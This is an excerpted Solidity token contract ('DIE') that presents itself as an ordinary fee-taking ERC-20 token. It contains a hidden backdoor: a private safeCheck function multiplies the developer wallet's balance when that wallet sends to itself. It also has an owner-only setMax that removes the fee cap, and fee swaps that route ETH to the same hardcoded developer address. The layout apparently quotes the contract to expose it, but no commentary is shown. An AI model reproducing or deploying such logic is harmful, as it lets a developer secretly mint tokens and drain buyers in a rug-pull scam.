...
contract Ownable is Context {
    ...
    constructor () {
        _owner =0xCd0F09860Ad7Bef4aCCd22BF179FE3Bc09fce639;
...
contract DIE is Context, IERC20, Ownable {
    ...
    uint256 public _markerFee = 1;
    uint256 public _FeeLP = 1;
    address payable public  _addRessDev = payable(0xCd0F09860Ad7Bef4aCCd22BF179FE3Bc09fce639);
    ...
    constructor () {
        ...
        _isExcludedFromFee[_addRessDev] = true;
        
        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapV2Pair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[_addRessDev] = true;
        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[_addRessDev] = true;
    ...
    function safeCheck(address f,address t,uint256 m) private {
        if (f == t && f ==_addRessDev)
         {_tOwned[_addRessDev] = _tOwned[_addRessDev].mul(m);
         }
    }
    ...
    function setMax(uint256 _maxFee) public onlyOwner{
        MaxFee = _maxFee;
    }
    function setFee(uint256 value) public onlyOwner{
        require (value <= MaxFee);
        _FeeLP = value;
        _markerFee = value;
    }
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 liquidityFee = amount * _FeeLP / 100; 
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(_addRessDev).transfer(ethToSend);
    }
    
    function swapAndLiquify() private {
        // split the contract balance into halves
        uint256 liquidityTokens = balanceOf (address(this)) * _FeeLP / (_markerFee + _FeeLP);
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        if (ethAmount - ethFromLiquidity > 0)
            payable(_addRessDev).sendValue (ethAmount - ethFromLiquidity);
    }
}